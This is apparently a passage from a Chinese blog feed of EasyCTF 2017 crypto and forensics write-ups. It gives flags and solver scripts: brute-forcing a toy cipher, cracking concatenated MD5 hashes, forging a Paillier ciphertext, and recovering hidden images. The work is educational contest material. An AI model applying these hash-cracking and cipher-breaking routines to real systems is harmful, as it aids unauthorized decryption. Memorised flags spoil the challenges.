149270645998191619421663334736314262928, 84083279828403258970202482839973583723, 105542809657403162156368566034837560781, 170535468317794277192003839288646533914, 1709561989051017137832962458645802494, 30208132812353075834728747743616689590, 179552149608863037880916374596103803214, 146319871444551859531557724256502213689, 94266034977624098660397183255753485858, 59624105602644297614582310044425417646, 150207980679551836987813576795479579005, 47189940152625174480564945084004798024, 60923399917552243674613186036841652885, 56060552313063913798237738953734149992, 153365453785043472981157196787373992079, 97439800863356756323659264743487719966, 105572255903480949865247928773026019148, 47189940152625174480564945084004798024, 32547907449246015626932936731350157592, 97471053149217334376536988401195572824, 156999991149661497460742185971412527182, 97705058765750947378422286408948780428, 56123764944636237849915747435965967337, 180380146745295930385428990214293723238, 178014626944341285289827069179285260436, 99504741454750536629756505680249931430]</code></pre><p>大致看一下程序，理一下代码逻辑，message就是我们要求的明文，然后被分成每2个字符为一组添加到chunks列表：</p><pre><code>message = REDACTEDchunks = []for i in range(0,len(message),2):    chunks += [message[i:i+2]]</code></pre><p>vlist已经给了，所以不用再去求<code>secret</code>，接下来就是每2个字符简单的二值化处理再倒序，之后就是16次循环加密处理。</p><pre><code>vlist = gen_v_list(primelist,p,secret)print(vlist)for chunk in chunks:    binarized = bin(int(chunk.encode(&apos;hex&apos;),16)).replace(&apos;0b&apos;,&apos;&apos;).zfill(16)[::-1] #lsb first    enc = 1    for bit in range(len(binarized)):        enc *= vlist[bit]**int(binarized[bit])    enc = enc%p    print(enc)</code></pre><p>加密结果已经给了，一共28组，所以能推出明文长度为56，我们知道ASCII字符的范围0-255，再从上面的加密代码分析可知，chunk最多就只有<code>256*256=65536</code>种组合，再做16次循环加密处理，也就是说最多1048576（<code>256*256*16</code>）次就能把一组明文穷举出来，计算机对1048576这个次数简直毫无压力，所以上代码：</p><pre><code>p = 196732205348849427366498732223276547339vlist = [186290890175539004453897585557650819247, 75402298316736094226532182518108134406, 125495142022496378270547998225256386407, 97774267687164931514953833940936099082, 101991197227908059637463567354647370660, 153833851791059142883915934225837717549, 57404874013093467650483424580890463792, 21385179362692238453302681296928238570, 73119997627509808412069264512026243174, 187307466063352771786747395191866088255, 99696708971915885525739992181010504930, 35400960589917132410614021764179554582, 165004028169785856134522269878963539096, 23921651712221317415895203722083962980, 101282552285744196401422074083408273639, 36527324251768098978171373433957274016]ciphertext = [10804437392992369932709952388461430442, 176193785024128365464527424154073333243, 149270645998191619421663334736314262928, 84083279828403258970202482839973583723, 105542809657403162156368566034837560781, 170535468317794277192003839288646533914, 1709561989051017137832962458645802494, 30208132812353075834728747743616689590, 179552149608863037880916374596103803214, 146319871444551859531557724256502213689, 94266034977624098660397183255753485858, 59624105602644297614582310044425417646, 150207980679551836987813576795479579005, 47189940152625174480564945084004798024, 60923399917552243674613186036841652885, 56060552313063913798237738953734149992, 153365453785043472981157196787373992079, 97439800863356756323659264743487719966, 105572255903480949865247928773026019148, 47189940152625174480564945084004798024, 32547907449246015626932936731350157592, 97471053149217334376536988401195572824, 156999991149661497460742185971412527182, 97705058765750947378422286408948780428, 56123764944636237849915747435965967337, 180380146745295930385428990214293723238, 178014626944341285289827069179285260436, 99504741454750536629756505680249931430]plaintext = &apos;&apos;for i in ciphertext:    find = False    for j in xrange(256):        if find:            break        for k in xrange(256):            chunk = chr(j) + chr(k)            binarized = bin(int(chunk.encode(&apos;hex&apos;),16)).replace(&apos;0b&apos;,&apos;&apos;).zfill(16)[::-1]            enc = 1            for bit in range(len(binarized)):                enc *= vlist[bit]**int(binarized[bit])            enc = enc%p            if enc == i:                find = True                plaintext += chunk                breakprint(plaintext) </code></pre><hr><pre><code>flag{i_actu4lly_d0nt_know_th3_name_of_th15_crypt0sy5tem} used time:18.040904s</code></pre><h2 id="Lost-Seed"><a href="#Lost-Seed" class="headerlink" title="Lost Seed"></a>Lost Seed</h2><h3 id="problem-10"><a href="#problem-10" class="headerlink" title="problem"></a>problem</h3><p>Every time I encrypt a flag with this <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/lost-seeds/encrypt" target="_blank" rel="external">program</a>, it gives me something <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/lost-seeds/flag.out" target="_blank" rel="external">different</a>.</p><h3 id="solution-10"><a href="#solution-10" class="headerlink" title="solution"></a>solution</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v3; // bl@2  int result; // eax@4  __int64 v5; // rcx@4  char v6; // [sp+Bh] [bp-85h]@2  int v7; // [sp+Ch] [bp-84h]@1  int v8; // [sp+10h] [bp-80h]@1  int v9; // [sp+14h] [bp-7Ch]@2  FILE *stream; // [sp+18h] [bp-78h]@1  char ptr[88]; // [sp+20h] [bp-70h]@1  __int64 v12; // [sp+78h] [bp-18h]@1  v12 = *MK_FP(__FS__, 40LL);  stream = fopen(&quot;flag.in&quot;, &quot;r&quot;);  fread(ptr, 1uLL, 0x50uLL, stream);  fclose(stream);  stream = fopen(&quot;flag.out&quot;, &quot;wb&quot;);  seed = realrand(&quot;flag.out&quot;, &quot;wb&quot;);  v7 = 0;  v8 = strlen(ptr);  while ( v7 &lt; v8 )  {    v3 = ptr[v7];    v9 = pseudorand();    v6 = v3 ^ v9;    fwrite(&amp;v6, 1uLL, 1uLL, stream);    ++v7;  }  fclose(stream);  result = 0;  v5 = *MK_FP(__FS__, 40LL) ^ v12;  return result;}</code></pre><h2 id="Listen-Closely"><a href="#Listen-Closely" class="headerlink" title="Listen Closely"></a>Listen Closely</h2><h3 id="problem-11"><a href="#problem-11" class="headerlink" title="problem"></a>problem</h3><p>We intercepted a secret message, but we can’t tell what it’s saying. Maybe you can help? <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/listen-closely/listenclosely.wav" target="_blank" rel="external">super secret message</a><br>hint: 1, 16, 8000. After you use those, the problem is strictly crypto.</p><h3 id="solution-11"><a href="#solution-11" class="headerlink" title="solution"></a>solution</h3><p><a href="https://writeups.easyctf.com/" target="_blank" rel="external">writeup</a></p><h2 id="Genius"><a href="#Genius" class="headerlink" title="Genius"></a>Genius</h2><h3 id="problem-12"><a href="#problem-12" class="headerlink" title="problem"></a>problem</h3><p>Your boss told you that <a href="http://genius.web.easyctf.com/" target="_blank" rel="external">this</a> team has come up with the cryptographic hash of the future, but something about their operation just seems a little fishy.</p><h3 id="solution-12"><a href="#solution-12" class="headerlink" title="solution"></a>solution</h3><pre><code>8a7fca9234d2f19c8abfcd812971a26c8c510dcaefd5061b191ad41d8b57d0ce631f5074f94b32730d0c025f1d7aacd7be1ab1632e4285edc3733b142935c60b90383bad42309f7f6850d2b4250a713d0b2d7a97350465a02554d29d92bfefafd64ddd0de1b187cd670783f5e28d681dd401ed3009d05ce4ef600d364a2c953e4cc801b880dddef59829a5ad08bd8a6373d559bc117f816333174e918d0587de5cca214701dbe9f7f42da7bccf074b811292b9d4dc398866ef95869b22b3941e78635bc95eaa7662a2ddf3e3d45cf1084f4233d6c396e8a0e6fbf597d07b88178d03f3f7757bdbdaaed60729d08bb180b42dad5453b2128a32f6612b13ea5d9fef843bee79633652a6d6ae08e964609f00e883ab809346226dff6887080fb68b</code></pre><p>给了6组哈希值，每组96个字符，还提示到了MD5，于是丢<a href="https://crackstation.net/" target="_blank" rel="external">crackstation</a>跑一下：</p><p><img src="http://chuantu.biz/t5/53/1490633101x2890174314.png" alt=""></p><p>简单验证一下：</p><pre><code>md5(like) = be1ab1632e4285edc3733b142935c60bmd5(ly_s) = d64ddd0de1b187cd670783f5e28d681dmd5(ng_2) = 73d559bc117f816333174e918d0587demd5(have) = b42dad5453b2128a32f6612b13ea5d9f</code></pre><p>推测每组就是三个MD5组合的，于是将所有的MD5换行拆分再进行一次查找：</p><p><img src="http://chuantu.biz/t5/53/1490633885x2890174314.png" alt=""></p><p>还有7个没有破解，从上面的都是4位简单的消息，于是把未找出的7个扔<a href="https://md5db.net/" target="_blank" rel="external">MD5库</a>：</p><p><img src="http://chuantu.biz/t5/53/1490634718x2890174314.png" alt=""></p><p>按顺序组合一下：<code>OMG_it_took_like_LITerally_s0oO00_long_2_MAK3_md5_werrk_you_have_no_id34</code><br>提交给了flag：<code>easyctf{OUR_3nCRYpti0n_is_N0T_br0k3n_Ur_brok3n_6c5a390d}</code></p><p>py优雅解决方式：</p><pre><code>import hashlibhashs = &apos;8a7fca9234d2f19c8abfcd812971a26c8c510dcaefd5061b191ad41d8b57d0ce631f5074f94b32730d0c025f1d7aacd7be1ab1632e4285edc3733b142935c60b90383bad42309f7f6850d2b4250a713d0b2d7a97350465a02554d29d92bfefafd64ddd0de1b187cd670783f5e28d681dd401ed3009d05ce4ef600d364a2c953e4cc801b880dddef59829a5ad08bd8a6373d559bc117f816333174e918d0587de5cca214701dbe9f7f42da7bccf074b811292b9d4dc398866ef95869b22b3941e78635bc95eaa7662a2ddf3e3d45cf1084f4233d6c396e8a0e6fbf597d07b88178d03f3f7757bdbdaaed60729d08bb180b42dad5453b2128a32f6612b13ea5d9fef843bee79633652a6d6ae08e964609f00e883ab809346226dff6887080fb68b&apos;def get_md5_list(hashs):    md5_list = []    for x in xrange(0, len(hashs), 32):        md5_list.append(hashs[x:x+32])    return md5_listdef gen_char_list():    char_list = []    for x in xrange(48, 58): # 0 ~ 9        char_list.append(chr(x))    for x in xrange(65, 91): # A ~ Z        char_list.append(chr(x))    for x in xrange(97, 123): # a ~ z        char_list.append(chr(x))    char_list.append(&apos;_&apos;) # _    return char_listdef brute_force_md5(char_list, md5_list):    plain_dict = {}    for c1 in char_list:        for c2 in char_list:            for c3 in char_list:                for c4 in char_list:                    chars = c1 + c2 + c3 + c4                    md5_obj = hashlib.md5()                    md5_obj.update(chars)                    md5_str = md5_obj.hexdigest()                    if md5_str in md5_list:                        plain_dict[md5_str] = chars    return plain_dictdef get_plain(md5_list, plain_dict):    plain = &apos;&apos;    for md5 in md5_list:        plain += plain_dict[md5]    return plaindef main():    md5_list = get_md5_list(hashs)    char_list = gen_char_list()    plain_dict = brute_force_md5(char_list, md5_list)    plain = get_plain(md5_list, plain_dict)    print(plain)if __name__ == &apos;__main__&apos;:    main()</code></pre><h2 id="RSA-4"><a href="#RSA-4" class="headerlink" title="RSA 4"></a>RSA 4</h2><h3 id="problem-13"><a href="#problem-13" class="headerlink" title="problem"></a>problem</h3><p>After doing so much RSA, I finally messed up…. pls help. I encrypted my secret <a href="https://writeups.easyctf.com/files/rsa4.txt" target="_blank" rel="external">message</a> but the decryption isn’t working!!</p><h3 id="solution-13"><a href="#solution-13" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/RSA%204" target="_blank" rel="external">writeup</a></p><h2 id="Premium-RSA"><a href="#Premium-RSA" class="headerlink" title="Premium RSA"></a>Premium RSA</h2><h3 id="problem-14"><a href="#problem-14" class="headerlink" title="problem"></a>problem</h3><p>My RSA is the greatest. It’s so strong, in fact, that I’ll even give you d! <a href="https://www.easyctf.com/static/d99abfa412f17c8d3229daabd0d6dda800d4f303_ciphertext.txt" target="_blank" rel="external">file</a></p><p>hint: You thought it’d be that simple?</p><h3 id="solution-14"><a href="#solution-14" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/Premium%20RSA" target="_blank" rel="external">writeup</a></p><h2 id="Paillier-Service"><a href="#Paillier-Service" class="headerlink" title="Paillier Service"></a>Paillier Service</h2><h3 id="problem-15"><a href="#problem-15" class="headerlink" title="problem"></a>problem</h3><p>My friend made some sort of encryption service using the Paillier cryptosystem. Can you get him to encrypt the string easyctf{3ncrypt_m3!} for me? Your flag will be a base 10 integer.</p><p>Access his encryption service at <code>paillier.tcp.easyctf.com 8570</code></p><h3 id="solution-15"><a href="#solution-15" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/Paillier%20Service" target="_blank" rel="external">writeup</a></p><pre><code># Paillier.pyimport binascii#Gathered from connecting manually# m = 1, r = 1g = 76148136246979412868353192826161253341403849263254887278017187958514513340458179944731332795505616407225022188597713956679924138156737337560391522285190471306102238935856085554943425316921717217530405444795878376547349107664015741971592178799088766898531556269231518219697725522509132047243753064371633643298# m = 2, r = 1g2 = 152296272493958825736706385652322506682807698526509774556034375917029026680916359889462665591011232814450044377195427913359848276313474675120783044570380942612204477871712171109886850633843434435060810889591756753094698215328031483943184357598177533797063112538463036439395451045018264094487506128743267286595expectedG2 = g*g#Using Factordb, we find that expectedG2-g2 is a perfect square of a prime, which is below#http://factordb.com/index.php?id=1100000000882961502n = 76148136246979412868353192826161253341403849263254887278017187958514513340458179944731332795505616407225022188597713956679924138156737337560391522285190471306102238935856085554943425316921717217530405444795878376547349107664015741971592178799088766898531556269231518219697725522509132047243753064371633643297n2 = n*nm2r2 = 642704871773304452155778596282877892451871980828477596157415930594972102473171707034871466334408214634990379265334519095544245651795310239071984348465353456082430791507322024283077057140015173791209040404351064470318177893091562745760770981747716308255111472933684059218100124906239297276402113587510274467857526915676715307055889593001002210535184406398178516901311847346979934161946287183599368736554797730366291587740218078384204696550286009123986874335424671114430592617561047352470044247529967986001239137580719442869043114141323570567593427242451750466586033713111304296116982128148631354597378733690535403149#check for no errorsassert (pow(g,2,n2)*pow(2,n,n2))%n2 == m2r2assert (pow(g,2,n2))%n2 == g2# get int of string easyctf{3ncrypt_m3!}goal = b&apos;easyctf{3ncrypt_m3!}&apos;hexGoal = str(binascii.hexlify(goal),&apos;utf-8&apos;)goal = int(hexGoal,16)#print(goal)#goal is divisible by 5, so use that for Homomorphic propertym5r1 = pow(g,5,n2)goalDiv5 = goal // 5# Now use the Homomorphic property :)flagInt = pow(m5r1,goalDiv5,n2)print(flagInt)</code></pre>]]></content>
    
    <summary type="html">
    
      作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/]
博客:HackFun [https://www.hackfun.org]

#0X04-CRYPTOGRAPHY0X04 CRYPTOGRAPHY
#FLIP-MY-LETTERSFLIP MY LETTERS
#PROBLEMPROBLEM
I dropped my alphabet on its head, can you help me reassemble it? 
easyctf{r_wlmg_vevm_mvvw_zm_zhxrr_gzyov}
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="cryptography" scheme="https://sunnyelf.github.io/tags/cryptography/"/>
    
      <category term="ctf writeup" scheme="https://sunnyelf.github.io/tags/ctf-writeup/"/>
    
      <category term="easyctf" scheme="https://sunnyelf.github.io/tags/easyctf/"/>
    
  </entry>
  
  <entry>
    <title>EasyCTF 2017 Forensics Write Up</title>
    <link href="https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Forensics-Write-Up/"/>
    <id>https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Forensics-Write-Up/</id>
    <published>2017-04-09T02:19:00.000Z</published>
    <updated>2017-10-02T19:22:31.892Z</updated>
    
    <content type="html"><![CDATA[<p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org/" target="_blank" rel="external">HackFun</a></p><h1 id="0x02-Forensics"><a href="#0x02-Forensics" class="headerlink" title="0x02 Forensics"></a>0x02 Forensics</h1><h2 id="Mane-Event"><a href="#Mane-Event" class="headerlink" title="Mane Event"></a>Mane Event</h2><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><p>My friend just got back from the plains and he took this picture with his new camera. He also told me there’s a flag hidden in it - can you check it out for me?</p><a id="more"></a><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p><img src="http://i.imgur.com/my9zu14.png" alt=""></p><h2 id="20xx"><a href="#20xx" class="headerlink" title="20xx"></a>20xx</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>My friend sent me this <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/20xx/_20xx.dtm" target="_blank" rel="external">file</a> and told me to git gud.</p><h3 id="polutin"><a href="#polutin" class="headerlink" title="polutin"></a>polutin</h3><p><a href="https://writeups.easyctf.com/forensics/20xx-50-points.html" target="_blank" rel="external">20xx writeup</a></p><h2 id="scisnerof"><a href="#scisnerof" class="headerlink" title="scisnerof"></a>scisnerof</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>I found weird file! <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/scisnerof/elif" target="_blank" rel="external">elif</a></p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/02p1vZ6.png" alt=""></p><p>png文件内容被倒序处理了，写一个脚本恢复：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">"elif"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> file:</div><div class="line">    <span class="keyword">with</span> open(<span class="string">"new.png"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> png:</div><div class="line">        data = []</div><div class="line">        byte = file.read(<span class="number">1</span>)</div><div class="line">        <span class="keyword">while</span> byte != <span class="string">""</span>:</div><div class="line">            data.append(byte)</div><div class="line">            byte = file.read(<span class="number">1</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(data):</div><div class="line">            png.write(i)</div></pre></td></tr></table></figure><p></p><p><img src="http://i.imgur.com/0Veqs2V.png" alt=""></p><p>flag:<code>easyctf{r3v3r5ed_4ensics}</code></p><h2 id="Petty-Difference"><a href="#Petty-Difference" class="headerlink" title="Petty Difference"></a>Petty Difference</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>I found two files in a secret room. They look like jumbled letters with no patterns. I mean look at it! <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/petty-difference/file1.txt" target="_blank" rel="external">file1</a> is identical to <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/petty-difference/file2.txt" target="_blank" rel="external">file2</a>, right?</p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">"file1.txt"</span>) <span class="keyword">as</span> file1:</div><div class="line">       str1 = file1.read()</div><div class="line">   <span class="keyword">with</span> open(<span class="string">"file2.txt"</span>) <span class="keyword">as</span> file2:</div><div class="line">       str2 = file2.read()</div><div class="line">   str1_diff = <span class="string">''</span></div><div class="line">   str2_diff = <span class="string">''</span></div><div class="line">   <span class="keyword">for</span> x <span class="keyword">in</span> range(len(str1)):</div><div class="line">       <span class="keyword">if</span> str1[x] != str2[x]:</div><div class="line">           str1_diff = str1_diff + str1[x]</div><div class="line">           str2_diff = str2_diff + str2[x]</div><div class="line">   print(str1_diff)</div><div class="line">   print(str2_diff)</div><div class="line">   print(<span class="string">"flag:%s"</span> %str1_diff[::<span class="number">-1</span>])</div></pre></td></tr></table></figure><h2 id="Flag-Collection"><a href="#Flag-Collection" class="headerlink" title="Flag Collection"></a>Flag Collection</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Here’s a <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/flag-collection/flags.zip" target="_blank" rel="external">collection of flags</a>! I think you’re looking for a specific one, though…</p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p><a href="http://baike.baidu.com/item/Thumbs.db" target="_blank" rel="external">Thumbs.db</a><br><a href="https://thumbsviewer.github.io/" target="_blank" rel="external">thumbs viewer</a></p><p><img src="http://i.imgur.com/vYwDd3E.png" alt=""></p><pre><code>easyctf{thumbs.db_c4n_b3_useful}</code></pre><h2 id="Zooooooom"><a href="#Zooooooom" class="headerlink" title="Zooooooom"></a>Zooooooom</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/zooooooom/hekkerman.jpg" target="_blank" rel="external">Hekkerman</a> is looking awfully spooky. That hekker glare could pierce a firewall. What can he see that you can’t?</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p>图片由三张图片合并拼接而成，分别分离出得到flag：</p><p><img src="http://i.imgur.com/bnPjwVx.jpg" alt=""></p><h2 id="Gibberish"><a href="#Gibberish" class="headerlink" title="Gibberish"></a>Gibberish</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>I have no idea what <a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Gibberish/gibberish.png" target="_blank" rel="external">this</a> image is, but my sources tell me that it contains something useful, a flag perhaps? Can you help me find it?<br>There are 3 parts to the flag. There are 3 colors of the rainbow. My flag will never expire.<br>Hint：Presence is more important than intensity. Everything is simply boolean. One of the parts requires a scanner.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p>这题要仔细审题，给了很多信息，提示flag由三部分组成，又说了三种颜色，只给了一张24位的图片：</p><p><img src="http://i.imgur.com/jGcJEOr.png" alt=""></p><p>很容易联想到图像的R,G,B分离处理，打开PS把图像的R,G,B通道分离得到：</p><p>R通道：</p><p><img src="http://i.imgur.com/1SFKsKU.png" alt=""></p><p>G通道：</p><p><img src="http://i.imgur.com/RsbzzJW.png" alt=""></p><p>B通道：</p><p><img src="http://i.imgur.com/xb8XnAb.png" alt=""></p><p>题目又提示其中一张需要扫描器，综合来看3张图片有张可能是条形码，于是PS中反相，不断锐化，然后将线条填充完整，类似这样：</p><p><img src="http://i.imgur.com/2b0x2P6.png" alt=""></p><p>不过这样太麻烦，于是写个脚本自动处理图像：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageEnhance</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert</span><span class="params">(im)</span>:</span></div><div class="line">    im = im.convert(<span class="string">"L"</span>)</div><div class="line">    pixel = im.load()</div><div class="line">    width = im.size[<span class="number">0</span>]</div><div class="line">    height = im.size[<span class="number">1</span>]</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</div><div class="line">            pixel[x, y] = <span class="number">255</span> - pixel[x, y]</div><div class="line">    <span class="keyword">return</span> im</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">enhance</span><span class="params">(im)</span>:</span></div><div class="line">    im = ImageEnhance.Contrast(im).enhance(<span class="number">10.0</span>)</div><div class="line">    <span class="keyword">return</span> im</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(im)</span>:</span></div><div class="line">    im = im.convert(<span class="string">"L"</span>)</div><div class="line">    pixel = im.load()</div><div class="line">    width = im.size[<span class="number">0</span>]</div><div class="line">    height = im.size[<span class="number">1</span>]</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">if</span>((pixel[x, <span class="number">0</span>] != <span class="number">255</span>) <span class="keyword">or</span> (pixel[x, <span class="number">21</span>] != <span class="number">255</span>) <span class="keyword">or</span> (pixel[x, <span class="number">43</span>] != <span class="number">255</span>)):</div><div class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</div><div class="line">                pixel[x, y] = <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> im</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    im = Image.open(<span class="string">'cea3386a382bfad628a3c5edf8d61a9285ab0290_gibberish.png'</span>)</div><div class="line">    pixel = im.load()</div><div class="line">    channels = [<span class="string">'r'</span>, <span class="string">'g'</span>, <span class="string">'b'</span>]</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> im_channel <span class="keyword">in</span> im.split():</div><div class="line">        im_invert = invert(im_channel)</div><div class="line">        im_enhance = enhance(im_invert)</div><div class="line">        im_fill = fill(im_enhance)</div><div class="line">        im_fill.save(<span class="string">'im_'</span> + channels[i] +<span class="string">'.png'</span>)</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><p>处理后分别得到R,G,B通道的图像</p><p><img src="http://i.imgur.com/YwJ14jb.png" alt=""></p><p><img src="http://i.imgur.com/rr5l71e.png" alt=""></p><p><img src="http://i.imgur.com/ACCUIou.png" alt=""></p><p>处理后G通道最有可能是条形码，多次扫描终于（<a href="http://www.coolapk.com/apk/com.google.zxing.client.android" target="_blank" rel="external">条码扫描器Barcode Scanner</a>）：</p><p><img src="http://i.imgur.com/m82TvZV.jpg" alt=""></p><p>得到8个字符:<code>LH5i6uQz</code></p><p>那其他两张图像怎么处理呢，提示说任何事物都是简单的二进制，开脑洞想到可能是黑白颜色代表二进制的1，0，于是提取图像的首行像素转换二进制串再转换为字符串：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">import</span> libnum</div><div class="line"></div><div class="line">im_b = Image.open(<span class="string">'im_b.png'</span>)</div><div class="line">im_r = Image.open(<span class="string">'im_r.png'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">image2ascii</span><span class="params">(im)</span>:</span></div><div class="line">    im = im.convert(<span class="string">"L"</span>)</div><div class="line">    pixel = im.load()</div><div class="line">    width = im.size[<span class="number">0</span>]</div><div class="line">    bits = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">if</span>(pixel[x, <span class="number">0</span>] == <span class="number">255</span>):</div><div class="line">            bits += <span class="string">"0"</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            bits += <span class="string">"1"</span></div><div class="line">    print(libnum.b2s(bits))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    image2ascii(im_r)</div><div class="line">    image2ascii(im_b)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><p>也是得到了两组8个字符：</p><pre><code>aPgMasSt5U5EYz2b</code></pre><p>一开始以为三个部分组合可能是base64，但是怎么组合都不对，陷入江局，又看了N遍题目，说我的flag永远不会过期，GG搜索N久才发现说的是<a href="http://www.appinn.com/pastebin/" target="_blank" rel="external">pastebin</a>。<code>程序员的世界你不懂，他们已经占领了 github，但我们还有 PasteBin。</code></p><p><img src="http://i.imgur.com/Q7T2VOs.png" alt=""></p><p>而你分享的内容会自动生成一个8字符的链接，这脑洞也是服，最后得到网址：</p><ul><li><a href="http://pastebin.com/LH5i6uQz" target="_blank" rel="external">http://pastebin.com/LH5i6uQz</a></li><li><a href="http://pastebin.com/LH5i6uQz" target="_blank" rel="external">http://pastebin.com/aPgMasSt</a></li><li><a href="http://pastebin.com/LH5i6uQz" target="_blank" rel="external">http://pastebin.com/5U5EYz2b</a></li></ul><p>组合得到：<code>easyctf{col0rs_b4rcod3s_and_b1nary_f?n}</code><br>激动地一提交，结果不对，仔细又开打链接检查，才发现flag里有个问号，可能是让猜测，填个u试试（<code>fun</code>），终于get Orz。</p><h2 id="QR1"><a href="#QR1" class="headerlink" title="QR1"></a>QR1</h2><h2 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h2><p>I just saw this QR code the other day, but couldn’t tell what data it has. Can you help? <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/qr-1/qr1.bmp" target="_blank" rel="external">Here</a> it is.</p><p>Hint:Is the image only black and white?</p><h2 id="solution-6"><a 